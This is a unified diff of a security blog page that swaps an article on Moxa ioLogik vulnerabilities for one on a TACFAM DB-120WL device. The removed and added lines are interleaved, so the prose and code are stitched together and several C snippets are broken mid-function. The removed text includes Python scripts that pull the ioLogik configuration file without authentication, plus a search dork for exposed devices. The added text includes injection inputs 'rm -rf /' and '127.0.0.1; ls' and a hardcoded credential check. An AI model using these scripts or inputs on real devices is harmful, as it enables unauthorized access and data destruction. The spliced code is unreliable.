-<pre class="wp-block-code"><code>#include &lt;stdio.h>
-#include &lt;stdlib.h>
-#include &lt;string.h>
 
 int main() {
-    // Print HTTP header
-    printf("Content-Type: text/plain\n\n");
+    char *userInput = getenv("QUERY_STRING");
+    printHTML(userInput);
+    return 0;
+}</code></pre>
 
-    // Check if the requested file is ik1212.txt
-    char *query_string = getenv("QUERY_STRING");
-    if (query_string != NULL &amp;&amp; strstr(query_string, "file=ik1212.txt") != NULL) {
-        // In a real-world scenario, access controls should be implemented here
-        // to check if the user has permission to access the requested file.
 
-        // Read the content of the configuration file
-        FILE *file = fopen("/path/to/ik1212.txt", "r");
-        if (file != NULL) {
-            char buffer&#91;1024];
-            size_t bytesRead;
-            while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
-                fwrite(buffer, 1, bytesRead, stdout);
-            }
-            fclose(file);
-        } else {
-            // Error: File not found or inaccessible
-            printf("Error: Configuration file not found or inaccessible\n");
-        }
+
+<p class="wp-block-paragraph">In this code snippet, the <code>printHTML()</code> function takes user input (<code>data</code>) and directly embeds it into the HTML response without proper sanitization or encoding. This allows an attacker to inject malicious JavaScript code into the web page.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="343" height="304" src="/wp-content/uploads/2023/10/5-min.webp" alt="logic of the XSS" class="wp-image-7874" srcset="/wp-content/uploads/2023/10/5-min.webp 343w, /wp-content/uploads/2023/10/5-min-300x266.webp 300w" sizes="(max-width: 343px) 100vw, 343px" /></figure>
+
+
+
+<p class="wp-block-paragraph">Misconfigurations occur when system administrators or users inadvertently leave their systems in an insecure state by incorrectly configuring permissions, access controls, or file permissions. Such misconfigurations can provide attackers with unauthorized access to critical files, including password files, compromising the security of the device.</p>
+
+
+
+<p class="wp-block-paragraph">Authentication plays a crucial role in securing devices and systems. However, vulnerabilities in the authentication mechanisms can lead to unauthorized access and compromise the security of the device.</p>
+
+
+
+<p class="wp-block-paragraph">This article explores a specific authentication bypass vulnerability in the TACFAM DB-120WL device, which involves the base64 decoding of an HTTP header. Through an in-depth analysis of vulnerable C code snippets, we will examine the root causes of this vulnerability and discuss effective mitigation strategies to enhance the device&#8217;s security.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="633" src="/wp-content/uploads/2023/10/6-min-1024x633.webp" alt="request of the vulnerabilities" class="wp-image-7875" srcset="/wp-content/uploads/2023/10/6-min-1024x633.webp 1024w, /wp-content/uploads/2023/10/6-min-300x185.webp 300w, /wp-content/uploads/2023/10/6-min-768x474.webp 768w, /wp-content/uploads/2023/10/6-min-1536x949.webp 1536w, /wp-content/uploads/2023/10/6-min.webp 2048w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p class="wp-block-paragraph">By examining relevant C code snippets in the TACFAM DB-120WL device&#8217;s authentication mechanism, we can uncover the root causes of the vulnerability. The following code snippet illustrates a potential scenario where the vulnerability exists:</p>
+
+
+
+<pre class="wp-block-code"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;openssl/bio.h&gt;
+#include &lt;openssl/evp.h&gt;
+
+void handleAuthentication(const char *header) {
+    char decoded&#91;1024];
+
+    // Base64 decode the header
+    BIO *bio = BIO_new(BIO_f_base64());
+    BIO *bioMem = BIO_new_mem_buf(header, strlen(header));
+    bioMem = BIO_push(bio, bioMem);
+    BIO_read(bioMem, decoded, strlen(header));
+    BIO_free_all(bioMem);
+
+    // Perform authentication
+    if (strcmp(decoded, "admin:password") == 0) {
+        printf("Authentication successful!\n");
+        // Grant access to restricted functionalities
     } else {
-        // Error: Invalid file requested
-        printf("Error: Invalid file requested\n");
+        printf("Authentication failed!\n");
+        // Deny access
     }
-
-    return 0;
-}
-</code></pre>
-
-
-
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="908" height="502" src="/wp-content/uploads/2024/01/image-4.png" alt="" class="wp-image-8313" srcset="/wp-content/uploads/2024/01/image-4.png 908w, /wp-content/uploads/2024/01/image-4-300x166.png 300w, /wp-content/uploads/2024/01/image-4-768x425.png 768w" sizes="(max-width: 908px) 100vw, 908px" /></figure>
-
-
-
-<p class="wp-block-paragraph">In this Python script, we use the requests library to send a GET request to the vulnerable web application (vulnerable_url) with a payload containing the filename ik1212.txt as a query parameter.</p>
-
-
-
-<p class="wp-block-paragraph">If the vulnerable web application is susceptible to broken access controls and allows unauthorized users to download configuration files without proper authentication or authorization checks, the script will successfully retrieve and print the contents of the ik1212.txt configuration file.</p>
-
-
-
-<pre class="wp-block-code"><code>import requests
-
-# URL of the vulnerable web application
-vulnerable_url = "http://example.com/download.cgi"
-
-# Payload to download the configuration file
-payload = {"file": "ik1212.txt"}
-
-# Send the malicious request to download the configuration file
-response = requests.get(vulnerable_url, params=payload)
-
-# Check if the request was successful
-if response.status_code == 200:
-    # Print the contents of the configuration file
-    print(response.text)
-else:
-    print("Failed to download configuration file.")
-</code></pre>
-
-
-
-<h2 class="wp-block-heading">Cryptography Failure</h2>
-
-
-
-<p class="wp-block-paragraph">Cryptography plays a pivotal role in ensuring data confidentiality and integrity. However, the effectiveness of cryptographic measures hinges on the algorithms and methodologies employed. MD5, once a popular hashing algorithm, has over the years been found to have significant vulnerabilities. Relying on MD5 for password hashing in modern systems is a glaring example of cryptography failure.</p>
-
-
-
-<ul class="wp-block-list">
-<li>The Scenario: Imagine a system that stores user passwords after hashing them with the MD5 algorithm. While this might seem secure at first glance, the inherent weaknesses of MD5 make these hashed passwords susceptible to attacks.</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>#include &lt;stdio.h>
-#include &lt;stdlib.h>
-#include &lt;string.h>
-#include &lt;openssl/md5.h>
-
-// Function to hash a password using MD5
-void hashPassword(const char *password, unsigned char *hashedPassword) {
-    MD5_CTX md5Context;
-    MD5_Init(&amp;md5Context);
-    MD5_Update(&amp;md5Context, password, strlen(password));
-    MD5_Final(hashedPassword, &amp;md5Context);
 }
 
 int main() {
-    char password&#91;100];
-    unsigned char hashedPassword&#91;MD5_DIGEST_LENGTH];
-
-    // Simulate user input (password)
-    printf("Enter your password: ");
-    scanf("%s", password);
-
-    // Hash the password using MD5
-    hashPassword(password, hashedPassword);
-
-    // Print the hashed password
-    printf("Hashed password (MD5): ");
-    for (int i = 0; i &lt; MD5_DIGEST_LENGTH; i++) {
-        printf("%02x", hashedPassword&#91;i]);
-    }
-    printf("\n");
-
+    const char *header = "Basic YWRtaW46cGFzc3dvcmQ="; // Base64-encoded "admin:password"
+    handleAuthentication(header);
     return 0;
+}</code></pre>
+
+
+
+<p class="wp-block-paragraph">In this code snippet, the <code>handleAuthentication()</code> function performs the authentication process by base64 decoding the provided header and comparing it to a hardcoded username and password combination. However, the vulnerability lies in the improper handling of the decoded data, allowing for authentication bypass.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="850" height="130" src="/wp-content/uploads/2023/10/7-min.webp" alt="logic of the authentication bypass" class="wp-image-7876" srcset="/wp-content/uploads/2023/10/7-min.webp 850w, /wp-content/uploads/2023/10/7-min-300x46.webp 300w, /wp-content/uploads/2023/10/7-min-768x117.webp 768w" sizes="(max-width: 850px) 100vw, 850px" /></figure>
+
+
+
+<p class="wp-block-paragraph">Cross-Site Request Forgery (CSRF) vulnerabilities can expose devices and systems to significant security risks. When combined with Remote Code Execution (RCE) capabilities, these vulnerabilities can result in severe consequences. This article explores a specific scenario in the TACFAM DB-120WL device where a CSRF vulnerability leads to RCE.</p>
+
+
+
+<p class="wp-block-paragraph">Through an in-depth analysis of vulnerable C code snippets, we will examine the root causes of this vulnerability and discuss effective mitigation strategies to enhance the device&#8217;s security.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="640" src="/wp-content/uploads/2023/10/8-min-1024x640.webp" alt="request of the page" class="wp-image-7877" srcset="/wp-content/uploads/2023/10/8-min-1024x640.webp 1024w, /wp-content/uploads/2023/10/8-min-300x187.webp 300w, /wp-content/uploads/2023/10/8-min-768x480.webp 768w, /wp-content/uploads/2023/10/8-min-1536x959.webp 1536w, /wp-content/uploads/2023/10/8-min.webp 2048w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p class="wp-block-paragraph">By examining relevant C code snippets in the TACFAM DB-120WL device, we can uncover the root causes of the vulnerability. The following code snippet illustrates a potential scenario where the vulnerability exists:</p>
+
+
+
+<pre class="wp-block-code"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+void processRequest(const char *request) {
+    char command&#91;1024];
+    snprintf(command, sizeof(command), "echo \"%s\" | sh", request); // Vulnerable line: Executing user-supplied command
+
+    if (system(command) == -1) {
+        printf("Failed to execute command.\n");
+    }
 }
-</code></pre>
 
+int main() {
+    const char *request = "rm -rf /"; // Malicious command
+    processRequest(request);
+    return 0;
+}</code></pre>
 
 
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="893" height="336" src="/wp-content/uploads/2024/01/image-5.png" alt="" class="wp-image-8314" srcset="/wp-content/uploads/2024/01/image-5.png 893w, /wp-content/uploads/2024/01/image-5-300x113.png 300w, /wp-content/uploads/2024/01/image-5-768x289.png 768w" sizes="(max-width: 893px) 100vw, 893px" /></figure>
 
+<p class="wp-block-paragraph">In this code snippet, the <code>processRequest()</code> function takes user-supplied data (request) and executes it as a command using the <code>system()</code> function. The lack of proper input validation and access controls allows an attacker to inject malicious commands and potentially achieve remote code execution.</p>
 
 
-<p class="wp-block-paragraph">In this vulnerable C code, we&#8217;re using the MD5 hashing algorithm from the OpenSSL library (&lt;openssl/md5.h&gt;) to hash user passwords. However, MD5 is known to have significant vulnerabilities, including collision attacks and pre-image attacks, which make it unsuitable for secure password hashing.</p>
 
+<p class="wp-block-paragraph">The OS Command Injection vulnerability in the TACFAM DB-120WL Device occurs when untrusted user input is directly included in system commands without proper validation or sanitization. In this case, the &#8220;action=ping&#8221; functionality allows attackers to inject arbitrary commands by leveraging the &#8216;;&#8217; character.</p>
 
 
-<p class="wp-block-paragraph">To exploit this vulnerability, an attacker could use various techniques such as rainbow tables or brute-force attacks to crack the hashed passwords generated by this vulnerable program, thereby compromising the security of the system.</p>
 
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="633" src="/wp-content/uploads/2023/10/9-min-1024x633.webp" alt="RC request" class="wp-image-7878" srcset="/wp-content/uploads/2023/10/9-min-1024x633.webp 1024w, /wp-content/uploads/2023/10/9-min-300x185.webp 300w, /wp-content/uploads/2023/10/9-min-768x474.webp 768w, /wp-content/uploads/2023/10/9-min-1536x949.webp 1536w, /wp-content/uploads/2023/10/9-min.webp 2048w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
 
 
-<h2 class="wp-block-heading">Scope of the Issues</h2>
 
+<p class="wp-block-paragraph">By examining relevant C code snippets in the TACFAM DB-120WL Device, we can uncover the root causes of the vulnerability. The following code snippet exemplifies a potential scenario where the vulnerability exists:</p>
 
 
-<p class="wp-block-paragraph">Moxa is a renowned leader in industrial networking, computing, and automation solutions, catering to diverse sectors such as transportation, energy, and manufacturing. Among its prominent offerings is the ioLogik series, comprising robust remote Ethernet I/O servers designed to facilitate seamless data acquisition and device connectivity in industrial environments. However, recent revelations have shed light on vulnerabilities plaguing a subset of these devices, raising concerns about the security posture of industrial networks worldwide.</p>
 
+<pre class="wp-block-code"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
 
+void handlePingRequest(const char *address) {
+    char command&#91;1024];
+    snprintf(command, sizeof(command), "ping -c 1 %s", address); // Vulnerable line: Command injection via user input
 
-<p class="wp-block-paragraph">With over 6000 ioLogik devices deployed globally, these vulnerabilities pose a significant threat to industrial networks&#8217; integrity and security. Shockingly, an alarming 150 devices have been identified as vulnerable to exploitation due to inherent flaws in their design and configuration. Compounding the problem is the absence of default authentication mechanisms in ioLogik devices, leaving them susceptible to unauthorized access and malicious exploitation.</p>
+    if (system(command) == -1) {
+        printf("Failed to execute command.\n");
+    }
+}
 
+int main() {
+    const char *address = "127.0.0.1; ls"; // Malicious input with injected command
+    handlePingRequest(address);
+    return 0;
+}</code></pre>
 
 
-<p class="wp-block-paragraph">dork:</p>
 
+<p class="wp-block-paragraph">In this code snippet, the <code>handlePingRequest()</code> function constructs a system command to execute a ping request using the provided address. However, the vulnerability lies in the lack of proper input validation or sanitization, allowing an attacker to inject arbitrary commands using the &#8216;;&#8217; character.</p>
 
 
-<ul class="wp-block-list">
-<li>title:&#8221;Remote Ethernet I/O Server&#8221;</li>
-</ul>
 
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="835" height="130" src="/wp-content/uploads/2023/06/rce-model.png" alt="logic if the Code vulnerable" class="wp-image-7092" srcset="/wp-content/uploads/2023/06/rce-model.png 835w, /wp-content/uploads/2023/06/rce-model-300x47.png 300w, /wp-content/uploads/2023/06/rce-model-768x120.png 768w" sizes="(max-width: 835px) 100vw, 835px" /></figure>
 
 
-<p class="wp-block-paragraph">Unveiling Vulnerabilities</p>
 
+<h2 class="wp-block-heading"><strong>Impact</strong></h2>
 
 
-<p class="wp-block-paragraph">The vulnerabilities in the Moxa ioLogik series have garnered attention due to their potential to compromise the confidentiality, integrity, and availability of industrial systems. Through comprehensive analysis and testing, security researchers have unearthed critical flaws, including but not limited to:</p>
 
+<p class="wp-block-paragraph">The code execution vulnerability in the TACFAM DB-120WL device poses significant risks to users and organizations, including:</p>
 
 
-<ul class="wp-block-list">
-<li>Default Authentication Absence: One of the most glaring issues is the absence of default authentication mechanisms in ioLogik devices, effectively granting unauthorized users unrestricted access to sensitive functionalities and data.</li>
 
+<p class="wp-block-paragraph">a. Unauthorized Access: Attackers can gain unauthorized access to the device, compromising its settings, and potentially infiltrating the entire network. This unauthorized access grants attackers control over network configurations, device functionalities, and sensitive information.</p>
 
 
-<li>Inadequate Input Validation: Insufficient input validation in certain ioLogik models leaves them vulnerable to injection attacks, enabling malicious actors to execute arbitrary commands or manipulate device configurations.</li>
 
+<p class="wp-block-paragraph">b. Data Breaches: Once in control, attackers may retrieve sensitive information stored on the device, such as login credentials, network configurations, or personally identifiable information. This compromised data can be exploited for malicious purposes or sold on the black market, leading to severe consequences for individuals and organizations.</p>
 
 
-<li>Authentication Bypass: Certain vulnerabilities allow attackers to bypass authentication mechanisms, gaining unauthorized access to device settings and control interfaces without proper credentials.</li>
 
+<p class="wp-block-paragraph">c. Network Compromise: With control over the TACFAM DB-120WL device, attackers can perform network reconnaissance, mapping the network topology, identifying connected devices, and exploiting additional vulnerabilities within the network infrastructure. This unrestricted access jeopardizes the security and integrity of the entire network.</p>
 
 
-<li>Remote Code Execution: Exploitable vulnerabilities in ioLogik firmware facilitate remote code execution, empowering attackers to execute arbitrary commands with elevated privileges, potentially causing system-wide disruptions.</li>
-</ul>
 
+<p class="wp-block-paragraph">Mitigation Strategies: To mitigate the code execution vulnerability in the TACFAM DB-120WL device and safeguard against potential attacks, the following measures are recommended:</p>
 
 
-<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" width="480" height="493" src="/wp-content/uploads/2024/01/image-6.png" alt="" class="wp-image-8315" style="width:480px;height:auto" srcset="/wp-content/uploads/2024/01/image-6.png 480w, /wp-content/uploads/2024/01/image-6-292x300.png 292w" sizes="(max-width: 480px) 100vw, 480px" /></figure>
 
+<p class="wp-block-paragraph">a. Firmware Updates: Users should ensure that their devices are running the latest firmware version provided by the manufacturer. Regularly checking for firmware updates and promptly applying them helps patch known vulnerabilities and bolster device security.</p>
 
 
-<p class="wp-block-paragraph">Impact on Industrial Networks</p>
 
+<p class="wp-block-paragraph">b. Network Segmentation: Implementing network segmentation limits the potential impact of a compromised device. By dividing the network into separate segments, an attacker&#8217;s lateral movement and access to critical resources can be restricted, minimizing the overall network risk.</p>
 
 
-<p class="wp-block-paragraph">The implications of these vulnerabilities extend far beyond individual devices, posing significant risks to industrial networks&#8217; operational continuity, data confidentiality, and regulatory compliance. The compromised integrity of ioLogik devices can result in various detrimental outcomes, including:</p>
 
+<p class="wp-block-paragraph">c. Network Monitoring: Deploy robust network monitoring solutions to detect and identify suspicious activities, such as unusual traffic patterns or unauthorized access attempts. Intrusion detection systems and anomaly detection mechanisms provide early warning signs of compromise, allowing for timely response and mitigation.</p>
 
 
-<ul class="wp-block-list">
-<li>Operational Disruption: Unauthorized access and control over ioLogik devices can lead to operational disruptions, downtime, and production delays, jeopardizing business continuity and revenue streams.</li>
 
-
-
-<li>Data Breaches: Breaching the confidentiality of industrial data stored and transmitted by ioLogik devices can result in sensitive information exposure, intellectual property theft, and regulatory non-compliance.</li>
-
-
-
-<li>Safety Risks: Compromised integrity of industrial control systems facilitated by vulnerable ioLogik devices can pose safety risks to personnel, assets, and the environment, endangering lives and livelihoods.</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>id: moxa-iologik-detection
-info:
-  name: Moxa ioLogik Detection
-  author: HADESS
-  severity: High
-  description: Detects Moxa ioLogik devices based on specific HTTP responses.
-requests:
-  - method: GET
-    path:
-      - /ik1212.txt
-    matchers-condition: OR
-    matchers:
-      - type: status
-        status:
-          - 200
-  - method: GET
-    matchers-condition: OR
-    path:
-      - /
-    matchers:
-      - type: word
-        words:
-          - "Welcome to ioLogik Series"
-    extractors:
-      - type: regex
-        regex: "Welcome to ioLogik Series"
-</code></pre>
-
-
-
-<p class="wp-block-paragraph">Addressing the Security Concerns</p>
-
-
-
-<p class="wp-block-paragraph">In response to the identified vulnerabilities in the ioLogik series, Moxa has taken proactive measures to mitigate security risks and bolster the resilience of its products. These measures include:</p>
-
-
-
-<ul class="wp-block-list">
-<li>Security Patches: Moxa has released firmware updates and security patches to address known vulnerabilities and enhance the robustness of ioLogik devices&#8217; security posture.</li>
-
-
-
-<li>Enhanced Authentication: Implementing robust authentication mechanisms, including multi-factor authentication (MFA) and role-based access control (RBAC), to prevent unauthorized access and ensure only authorized users can interact with the devices.</li>
-
-
-
-<li>Input Validation: Strengthening input validation mechanisms to thwart injection attacks and ensure that user inputs are properly sanitized to prevent exploitation of vulnerabilities.</li>
-
-
-
-<li>Security Awareness: Promoting security awareness among customers, partners, and stakeholders to educate them about potential risks and best practices for securing ioLogik devices and industrial networks.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">To fetch relay information from a device at http://192.168.1.100, run:</p>
-
-
-
-<p class="wp-block-paragraph">python iologik_script.py &#8211;url http://192.168.1.100</p>
-
-
-
-<p class="wp-block-paragraph">To download the configuration file from a device at http://192.168.1.100, run:</p>
-
-
-
-<p class="wp-block-paragraph">python iologik_script.py &#8211;url http://192.168.1.100 &#8211;conf</p>
-
-
-
-<pre class="wp-block-code"><code>import requests
-import argparse
-
-def fetch_relay_information(url):
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            relay_info = response.text  # Assuming relay information is in the response body
-            print("Relay Information:")
-            print(relay_info)
-        else:
-            print(f"Failed to fetch relay information. Status Code: {response.status_code}")
-    except requests.RequestException as e:
-        print(f"Error fetching relay information: {e}")
-
-def download_configuration(url):
-    try:
-        response = requests.get(url + "/ik1212.txt")
-        if response.status_code == 200:
-            with open("ik1212.txt", "wb") as file:
-                file.write(response.content)
-            print("Configuration file downloaded successfully.")
-        else:
-            print(f"Failed to download configuration file. Status Code: {response.status_code}")
-    except requests.RequestException as e:
-        print(f"Error downloading configuration file: {e}")
-
-def main():
-    parser = argparse.ArgumentParser(description="Moxa ioLogik E1212 Script")
-    parser.add_argument("--url", default="http://localhost", help="URL of the ioLogik E1212 device (default: http://localhost)")
-    parser.add_argument("--conf", action="store_true", help="Download configuration file /ik1212.txt")
-    args = parser.parse_args()
-
-    if args.conf:
-        download_configuration(args.url)
-    else:
-        fetch_relay_information(args.url)
-
-if __name__ == "__main__":
-    main()
-</code></pre>
+<p class="wp-block-paragraph">d. Vendor Security Best Practices: Engage with the device manufacturer and adhere to their recommended security best practices. This includes using strong, unique passwords, disabling unnecessary services, and implementing encryption protocols to strengthen the overall security posture of the TACFAM DB-120WL device.</p>
 
 
 
@@ -2127,19 +1948,7 @@ if __name__ == "__main__":
 
 
 
-<p class="wp-block-paragraph">In the intricate tapestry of cybersecurity, vulnerabilities such as CSRF, XSS, cryptography failures, and broken access controls emerge as critical threads that can unravel the entire fabric if not addressed promptly. Our analysis underscores the profound implications of these vulnerabilities, each of which can serve as a potential gateway for malicious actors.</p>
-
-
-
-<p class="wp-block-paragraph">The exploitation of CSRF to change passwords underscores the importance of ensuring that every request made to a web application is genuine and authorized. Without robust CSRF protections, attackers can manipulate users into performing unintended actions, leading directly to account takeovers. Similarly, XSS vulnerabilities, which allow attackers to inject malicious scripts into web pages, can compromise user sessions and provide unauthorized access to accounts, emphasizing the need for stringent input validation and output encoding.</p>
-
-
-
-<p class="wp-block-paragraph">Cryptography, the bedrock of data security, when compromised, can expose sensitive information, making systems susceptible to data breaches and espionage. The use of outdated or weak cryptographic algorithms can jeopardize the entire security infrastructure of an organization. Lastly, broken access controls, which determine who can access specific resources, can lead to unauthorized data access, system compromises, and potential exposure of confidential information when not properly implemented.</p>
-
-
-
-<p class="wp-block-paragraph">Collectively, these vulnerabilities highlight the interconnected nature of web security. Addressing one vulnerability in isolation is insufficient; a holistic approach is imperative. Organizations must prioritize regular security audits, adopt best practices in web development, and invest in continuous training to stay ahead of potential threats. In an era where digital interactions are the norm, ensuring the security of these interactions is paramount.</p>
+<p class="wp-block-paragraph">The code execution vulnerability in the TACFAM DB-120WL device poses significant security risks to users and organizations relying on this networking solution. This analysis has provided an in-depth examination of the vulnerability, its potential impact, and suggested strategies to mitigate the risk. By proactively applying firmware updates, implementing network segmentation, monitoring network activities, and following vendor security best</p>
     </div>
 
     <!-- ═══ CAREER PLATFORM CTA ═══ -->
@@ -2157,27 +1966,27 @@ if __name__ == "__main__":
 
         <!-- Headline -->
         <h3 style="font-family:var(--font-display);font-size:24px;font-weight:800;color:#fff;margin:0 0 8px;line-height:1.3">
-          Ready to Accelerate Your Cybersecurity Career?
+          Put this research to work on your environment
         </h3>
         <p style="font-size:15px;color:rgba(255,255,255,0.55);line-height:1.7;max-width:520px;margin:0 auto 28px">
-          Access structured learning paths, hands-on skill labs, and expert coaching — everything you need to land your next role.
+          The team behind this article runs attack surface management, SAST, red team operations and vulnerability research for organizations that need answers, not checklists.
         </p>
 
         <!-- Buttons -->
         <div style="display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap">
-          <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
+          <a href="/products/" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M13.8 12H3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Start Free
+            Explore Services
           </a>
-          <a href="https://career.hadess.io/games/" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
+          <a href="/products/#contact" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" stroke-linecap="round" stroke-linejoin="round"/><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Hack &amp; Learn Games
+            Talk to an Expert
           </a>
         </div>
 
         <!-- Subtle trust line -->
         <p style="font-size:12px;color:rgba(255,255,255,0.3);margin:20px 0 0;letter-spacing:0.3px">
-          100% free to start &middot; No credit card required &middot; 80+ skill modules
+          ASM &middot; SAST &middot; Red Team &middot; Vulnerability Research &middot; Career
         </p>
       </div>
     </div>
@@ -2304,11 +2113,11 @@ function showCopied(){
 <div style="max-width:var(--max-w);margin:0 auto;padding:0 32px 80px">
   <div style="background:linear-gradient(135deg,rgba(250,204,21,0.08),rgba(245,158,11,0.03));border:1px solid var(--gold-border);border-radius:20px;padding:60px;text-align:center;position:relative;overflow:hidden">
     <div style="content:'';position:absolute;top:-100px;right:-100px;width:300px;height:300px;background:radial-gradient(circle,rgba(250,204,21,0.1),transparent 70%);pointer-events:none"></div>
-    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Ready to Accelerate Your Cybersecurity Career?</h2>
-    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Structured paths, expert coaching, and hands-on skill development — all in one platform.</p>
-    <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
+    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Know your exposure before attackers do.</h2>
+    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Attack surface management, SAST, red team operations and vulnerability research — from the team behind HADESS research.</p>
+    <a href="/products/" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
       <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Explore Products &amp; Services
     </a>
   </div>
 </div>
@@ -2331,59 +2140,38 @@ function showCopied(){
           </div>
           <div style="display:flex;align-items:center;gap:10px;font-size:13px;color:var(--text-muted)">
             <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color:var(--gold);flex-shrink:0"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg>
-            career@hadess.io
+            security@hadess.io
           </div>
         </div>
         <div style="display:flex;gap:12px">
           <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
           <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
